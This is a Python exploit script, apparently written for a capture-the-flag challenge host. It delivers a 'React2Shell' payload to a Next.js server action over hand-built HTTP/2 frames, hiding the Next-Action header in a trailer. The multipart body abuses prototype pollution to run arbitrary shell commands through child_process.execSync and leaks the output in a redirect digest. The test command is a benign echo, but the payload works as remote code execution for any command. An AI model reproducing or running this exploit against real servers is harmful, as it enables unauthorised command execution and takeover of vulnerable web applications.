#!/usr/bin/env python3
"""
Test if React2Shell payload triggers action execution vs recovery-offline
"""
import socket
import ssl
import struct
import time
import base64
import re
from urllib.parse import unquote
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# Using action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def open_h2():
    """Open HTTP/2 TLS connection"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError(f"ALPN mismatch: {sock.selected_alpn_protocol()}")
    sock.sendall(PREFACE)

    # Empty SETTINGS
    settings_frame = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    sock.sendall(settings_frame)

    return sock

def read_frames(sock, want_stream=1, max_time=10):
    """Read HTTP/2 frames until END_STREAM"""
    frames = []
    end_time = time.time() + max_time

    while time.time() < end_time:
        try:
            # Read frame header (9 bytes)
            header = sock.recv(9)
            if len(header) < 9:
                break

            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF

            # Read frame payload
            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            frames.append((frame_type, flags, stream_id, payload))

            # Check for END_STREAM
            if stream_id == want_stream and (flags & 1):
                break

        except socket.timeout:
            break
        except Exception:
            break

    return frames, True

def parse_response(frames):
    """Parse HTTP/2 response for RSC content"""
    headers = {}
    body = b""
    status = None

    for frame_type, flags, stream_id, payload in frames:
        if frame_type == 1:  # HEADERS
            if b":status" in payload:
                try:
                    status_match = re.search(rb':status\x03(\d{3})', payload)
                    if status_match:
                        status = status_match.group(1).decode()
                except:
                    pass
        elif frame_type == 0:  # DATA
            body += payload

    return status or "200", headers, body

def send_payload(name, body_content, content_type="multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"):
    """Send payload via HTTP/2 trailers"""
    sock = open_h2()
    sid = 1

    # Consume settings ACK
    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    # Prepare headers WITHOUT Next-Action
    enc = Encoder()
    header_block = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_content))),
        ("trailer", "next-action"),
        ("user-agent", f"probe35-{name}"),
    ])

    # Prepare trailer with Next-Action
    trailer_block = enc.encode([
        ("next-action", ACTION_ID),
    ])

    # Send frames
    raw = struct.pack(">I", len(header_block))[1:] + b"\x01" + b"\x04" + struct.pack(">I", sid) + header_block
    sock.sendall(raw)

    raw = struct.pack(">I", len(body_content))[1:] + b"\x00" + b"\x00" + struct.pack(">I", sid) + body_content
    sock.sendall(raw)

    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + b"\x05" + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    frames, _ = read_frames(sock, want_stream=sid, max_time=10)
    sock.close()

    return parse_response(frames)

def analyze_body(body):
    """Analyze RSC response body for action result"""
    body_str = body.decode('utf-8', errors='ignore')

    # Look for row 1 (action result)
    row1_match = re.search(r'^1:(.+?)(?:\n|$)', body_str, re.MULTILINE)
    if row1_match:
        row1_content = row1_match.group(1)
        print(f"    Row 1 content: {row1_content}")

        if "recovery-offline" in row1_content:
            return "recovery-offline (expected for non-RCE payloads)"
        elif "digest" in row1_content:
            return f"ERROR with digest: {row1_content}"
        elif '"ok":' in row1_content:
            return f"Action returned data: {row1_content}"
        else:
            return f"Unknown row 1: {row1_content}"
    else:
        return "No row 1 found in response"

def main():
    print("=" * 60)
    print("Testing React2Shell payload components")
    print("=" * 60)

    # Test 1: Baseline - simple empty FormData (should give recovery-offline)
    print("\n[1] Testing baseline empty FormData...")
    baseline_body = (
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="test"\r\n\r\n'
        'value\r\n'
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ).encode()

    status, headers, body = send_payload("baseline", baseline_body)
    result = analyze_body(body)
    print(f"    Status: {status}, Result: {result}")

    # Test 2: React2Shell payload but with benign command
    print("\n[2] Testing React2Shell payload (echo test)...")

    # Simple test command
    cmd = "echo 'test123'"
    cmd_escaped = cmd.replace("'", "\\'")

    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':5000}}).toString('base64');"
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    react2shell_body = (
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n'
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="2"\r\n\r\n'
        '[]\r\n'
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ).encode()

    status2, headers2, body2 = send_payload("react2shell", react2shell_body)
    result2 = analyze_body(body2)
    print(f"    Status: {status2}, Result: {result2}")

    # Test 3: Check if we can trigger any side channel
    print("\n[3] Testing for side-channel indicators...")

    # Look for any differences in response timing or headers
    start_time = time.time()
    status3, headers3, body3 = send_payload("timing", react2shell_body)
    elapsed = time.time() - start_time
    print(f"    Response time: {elapsed:.2f}s")

    # Check response size
    print(f"    Response size: {len(body3)} bytes")

    # Look for any error indicators
    body3_str = body3.decode('utf-8', errors='ignore')
    if "Error" in body3_str or "Exception" in body3_str:
        print("    Found error indicators in response")
    else:
        print("    No obvious error indicators")

    print("\n" + "=" * 60)
    print("Analysis complete. Check if React2Shell payload affects action behavior.")

if __name__ == "__main__":
    main()